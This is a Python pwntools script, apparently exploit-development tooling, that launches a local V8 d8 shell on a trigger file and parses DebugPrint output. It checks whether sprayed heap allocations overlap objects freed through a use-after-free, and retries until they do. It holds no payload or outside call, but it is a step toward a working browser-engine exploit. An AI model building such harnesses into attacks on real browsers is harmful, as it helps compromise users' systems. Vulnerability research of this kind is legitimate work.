#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from dataclasses import dataclass
from itertools import combinations
from pwn import *

context.update(arch='amd64')
exe = r'../../v8/out/x64.release/d8'

global_cnt = 0

PTR_SIZE = 8
SPRAY_FACTOR = 100

UAF_SIZE = 1 << 15
NEW_OBJ_SIZE = UAF_SIZE


@dataclass
class HeapObject:
    ELEM_MARKER = b'- elements: '
    DBGPRNT_MARKER = b'DebugPrint: '

    base_addr: int
    elements_addr: int
    elements_size: int

    def __init__(self, io: tube, elements_size):
        io.recvuntil(HeapObject.DBGPRNT_MARKER)
        self.base_addr = int(io.recvline().split(b':')[0], 16)

        io.recvuntil(HeapObject.ELEM_MARKER)
        self.elements_addr = int(io.recvline().split(b' ')[0], 16)
        self.elements_size = elements_size

    def __str__(self):
        return (
            f'base: {hex(self.base_addr)}\nelements: {hex(self.elements_addr)}'
        )

    @property
    def elements_range(self):
        return set(
            range(self.elements_addr, self.elements_addr + self.elements_size))

    @property
    def base_range(self):
        return set(range(self.base_addr, self.base_addr + 16 + (0 * 8)))

    @property
    def range(self):
        return self.base_range | self.elements_range

    def overlap(self, other) -> set:
        return self.range & other.range


def start(argv=[], *a, **kw):
    return process([exe] + argv, *a, **kw)


def dump_overlap(main_uaf, new_obj, overlap: set, verbose: bool = False) -> None:
    overlap_elements = [hex(e) for e in overlap
                        ] if verbose else [hex(list(overlap)[0])]
    log.success(f'Overlap: ({len(overlap)})\n' + f'{overlap_elements})\n' +
                f'{new_obj}')

    if new_obj.base_range & main_uaf.elements_range:
        log.success("awesome")

    elif new_obj.elements_range & main_uaf.base_range:
        log.success("awesome2")

    elif new_obj.elements_range & main_uaf.elements_range:
        log.success("awesome3")

    elif new_obj.base_range & main_uaf.base_range:
        log.warn("sucks")

    else:
        log.warn("wtf")




def verbose_initial_state(uaf_obj: HeapObject) -> None:
    log.info(f'''***************
UAF:
{uaf_obj}

uaf_size: {hex(uaf_obj.elements_size)}
uaf_end: {hex(uaf_obj.elements_addr + uaf_obj.elements_size)}
base_end: {hex(uaf_obj.base_addr + 24)}
***************
''')


def main_yacombo(io) -> bool:
    success = False
    # Parse DebugPrint of uaf_objects

    freed_objects = []
    for _ in range(50):
        main_uaf = HeapObject(io, PTR_SIZE * 2)
        larr_uaf = HeapObject(io, UAF_SIZE)
        ta_uaf = HeapObject(io, 1024)
        global_obj = HeapObject(io, 4 * 3)
        freed_objects += [main_uaf, larr_uaf, ta_uaf, global_obj]

    # Parse DebugPrint of the rest of them
    for _ in range(SPRAY_FACTOR):
        new_obj = HeapObject(io, NEW_OBJ_SIZE)

        overlap = set()
        for uaf in freed_objects:
            overlap |= new_obj.overlap(uaf)

        if len(overlap) != 0:
            log.success(
                f'Overlap: ({len(overlap)} :: {hex(list(overlap)[-1])})\n{new_obj}'
            )
            success = True

    return success


def main_wp(io) -> bool:
    main_uaf = HeapObject(io, PTR_SIZE * 2)
    larr_uaf = HeapObject(io, UAF_SIZE)
    ta_uaf = HeapObject(io, 1024)
    global_obj = HeapObject(io, 4 * 3)
    freed_objects = [main_uaf, larr_uaf, ta_uaf, global_obj]
    # Parse DebugPrint of the rest of them
    for i in range(SPRAY_FACTOR):
        new_obj = HeapObject(io, NEW_OBJ_SIZE)

        overlap = set()
        for uaf in freed_objects:
            overlap |= new_obj.overlap(uaf)

        if len(overlap) != 0:
            log.success(
                f'Overlap: ({len(overlap)} :: {hex(list(overlap)[-1])})\n{new_obj}'
            )

    return False


def main_poc(io) -> bool:
    SPRAY_FACTOR = 1000
    UAF_SIZE = 1 << 20
    NEW_UAF_SIZE = UAF_SIZE

    main_uaf = HeapObject(io, UAF_SIZE)
    for i in range(SPRAY_FACTOR):
        new_obj = HeapObject(io, NEW_OBJ_SIZE)
        overlap = new_obj.overlap(main_uaf)

        if len(overlap) != 0:
            log.success(
                f'Overlap: ({len(overlap)} :: {hex(list(overlap)[-1])})\n{new_obj}'
            )


def main_trigger(io):
    SPRAY_FACTOR = 1000
    UAF_SIZE = 1 << 20
    NEW_UAF_SIZE = UAF_SIZE
    new_objects = []

    main_uaf = HeapObject(io, UAF_SIZE)
    verbose_initial_state(main_uaf)

    for i in range(SPRAY_FACTOR):
        new_obj = HeapObject(io, NEW_OBJ_SIZE)
        new_objects.append(new_obj)
        overlap = new_obj.overlap(main_uaf)

        if len(overlap) != 0:
            dump_overlap(main_uaf, new_obj, overlap)

    # Sanity check if any two normal allocations overlap
    for a,b in combinations(new_objects, 2):
        if a.overlap(b):
            log.info(f"SHOULD NEVER\n{a}\n{b}")


def main():
    global global_cnt
    success = False

    io = start(['--allow-natives-syntax', 'trigger.js'])

    log.info(f'Iteration: {global_cnt}')
    main_trigger(io)
    io.kill()
    global_cnt += 1

    return success


if __name__ == '__main__':
    while True:
        if main():
            break
        log.warn("Failed. Spawning again.")
